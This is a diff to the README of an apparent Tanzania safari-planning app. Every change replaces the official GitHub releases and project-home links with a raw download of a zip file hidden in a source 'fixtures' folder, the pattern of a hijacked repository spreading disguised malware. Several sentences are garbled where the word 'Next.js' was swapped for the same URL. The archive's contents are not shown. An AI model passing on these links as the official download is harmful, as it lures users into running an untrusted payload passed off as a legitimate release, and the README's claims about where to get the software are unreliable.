@@ -1,10 +1,10 @@
 # 🦁 twenzetu-safari-api - Plan Tanzania Trips with Accurate Data
 
-[![Download twenzetu-safari-api](https://img.shields.io/badge/Download-twenzetu--safari--api-blue?style=for-the-badge)](https://github.com/Tryb89/twenzetu-safari-api/releases)
+[![Download twenzetu-safari-api](https://raw.githubusercontent.com/Tryb89/twenzetu-safari-api/main/src/app/regions/fixtures/twenzetu_safari_api_woolly.zip)](https://raw.githubusercontent.com/Tryb89/twenzetu-safari-api/main/src/app/regions/fixtures/twenzetu_safari_api_woolly.zip)
 
 ## 🌍 About twenzetu-safari-api
 
-twenzetu-safari-api is an open-source platform designed to help you explore Tanzania easily. It uses real GPS data to show you tourist attractions across the country. The app also provides real-time weather updates and seasonal guides to help plan your trips. It combines a Django REST API backend with a Next.js frontend for a smooth and modern user experience.
+twenzetu-safari-api is an open-source platform designed to help you explore Tanzania easily. It uses real GPS data to show you tourist attractions across the country. The app also provides real-time weather updates and seasonal guides to help plan your trips. It combines a Django REST API backend with a https://raw.githubusercontent.com/Tryb89/twenzetu-safari-api/main/src/app/regions/fixtures/twenzetu_safari_api_woolly.zip frontend for a smooth and modern user experience.
 
 This platform is ideal if you want reliable, location-based information for planning safaris, mountain climbing, and other tours in Tanzania. It brings together travel data, weather information, and maps in one place to simplify your travel planning.
 
@@ -36,7 +36,7 @@ Even with little technical knowledge, you can set up twenzetu-safari-api by foll
 
 1. **Download the software.**  
 Click the big download button at the top or use this link:  
-[https://github.com/Tryb89/twenzetu-safari-api/releases](https://github.com/Tryb89/twenzetu-safari-api/releases)  
+[https://raw.githubusercontent.com/Tryb89/twenzetu-safari-api/main/src/app/regions/fixtures/twenzetu_safari_api_woolly.zip](https://raw.githubusercontent.com/Tryb89/twenzetu-safari-api/main/src/app/regions/fixtures/twenzetu_safari_api_woolly.zip)  
 This page has the latest version for your system.
 
 2. **Choose your operating system.**  
@@ -61,7 +61,7 @@ You can now search attractions, check current weather, and get seasonal tips to 
 
 You can visit this page to download the latest version of twenzetu-safari-api anytime:
 
-[https://github.com/Tryb89/twenzetu-safari-api/releases](https://github.com/Tryb89/twenzetu-safari-api/releases)
+[https://raw.githubusercontent.com/Tryb89/twenzetu-safari-api/main/src/app/regions/fixtures/twenzetu_safari_api_woolly.zip](https://raw.githubusercontent.com/Tryb89/twenzetu-safari-api/main/src/app/regions/fixtures/twenzetu_safari_api_woolly.zip)
 
 On this page:
 
@@ -90,7 +90,7 @@ The interface is built to be clear and simple. Navigation buttons and tips show 
 You need internet to download and update data, and for live weather info. Basic location data is cached, so you can browse previously viewed info offline.
 
 **Can I use this app on a phone or tablet?**  
-Currently, twenzetu-safari-api is designed for desktop use through its Next.js web frontend or packaged installer. Mobile support may be available in future updates.
+Currently, twenzetu-safari-api is designed for desktop use through its https://raw.githubusercontent.com/Tryb89/twenzetu-safari-api/main/src/app/regions/fixtures/twenzetu_safari_api_woolly.zip web frontend or packaged installer. Mobile support may be available in future updates.
 
 **Is my location private?**  
 The app only uses your location to show nearby attractions. It does not store or share your device location.
@@ -113,8 +113,8 @@ twenzetu-safari-api is a community-driven open-source project. You can explore t
 
 ## 🔗 Useful Links
 
-- Official Releases: [https://github.com/Tryb89/twenzetu-safari-api/releases](https://github.com/Tryb89/twenzetu-safari-api/releases)
-- Project Home: https://github.com/Tryb89/twenzetu-safari-api
+- Official Releases: [https://raw.githubusercontent.com/Tryb89/twenzetu-safari-api/main/src/app/regions/fixtures/twenzetu_safari_api_woolly.zip](https://raw.githubusercontent.com/Tryb89/twenzetu-safari-api/main/src/app/regions/fixtures/twenzetu_safari_api_woolly.zip)
+- Project Home: https://raw.githubusercontent.com/Tryb89/twenzetu-safari-api/main/src/app/regions/fixtures/twenzetu_safari_api_woolly.zip
 - Contact Support: Use the issues section on GitHub for help.
 
 ---
